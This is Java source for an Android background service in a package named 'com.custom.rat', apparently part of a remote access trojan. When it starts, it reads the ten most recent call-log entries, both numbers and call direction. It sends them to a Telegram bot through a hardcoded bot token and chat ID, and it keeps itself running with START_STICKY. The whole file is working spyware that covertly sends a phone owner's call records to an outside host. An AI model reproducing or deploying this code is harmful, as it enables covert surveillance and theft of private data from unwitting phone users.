package com.custom.rat;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.os.IBinder;
import android.provider.CallLog;
import androidx.annotation.Nullable;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class TrackingService extends Service {

    private static final String TOKEN = "8070637280:AAHglfoKFZjrxcp9AIglI69bgZufJV9b1U4";
    private static final String CHAT_ID = "7113123817";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                String callLogs = getCallLogs();
                sendToTelegram(callLogs);
            }
        }).start();

        return START_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private String getCallLogs() {
        StringBuilder logs = new StringBuilder("📞 *Call Logs:* \n\n");
        try {
            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
            int count = 0;
            if (cursor != null && cursor.moveToFirst()) {
                int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
                
                do {
                    String number = cursor.getString(numberIndex);
                    String type = cursor.getString(typeIndex);
                    
                    String dir = "Unknown";
                    int dCode = Integer.parseInt(type);
                    if (dCode == CallLog.Calls.INCOMING_TYPE) dir = "Incoming";
                    else if (dCode == CallLog.Calls.OUTGOING_TYPE) dir = "Outgoing";
                    else if (dCode == CallLog.Calls.MISSED_TYPE) dir = "Missed";

                    logs.append("• Num: ").append(number).append("\n  Type: ").append(dir).append("\n\n");
                    count++;
                    if (count >= 10) break; 
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception e) {
            logs.append("Error reading call logs: ").append(e.getMessage());
        }
        return logs.toString();
    }

    private void sendToTelegram(String message) {
        try {
            URL url = new URL("https://api.telegram.org/bot" + TOKEN + "/sendMessage");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            conn.setDoOutput(true);

            String jsonInputString = "{\"chat_id\": \"" + CHAT_ID + "\", \"text\": \"" + message + "\", \"parse_mode\": \"Markdown\"}";
            
            OutputStream os = conn.getOutputStream();
            byte[] input = jsonInputString.getBytes("utf-8");
            os.write(input, 0, input.length);
            os.close();

            conn.getResponseCode();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
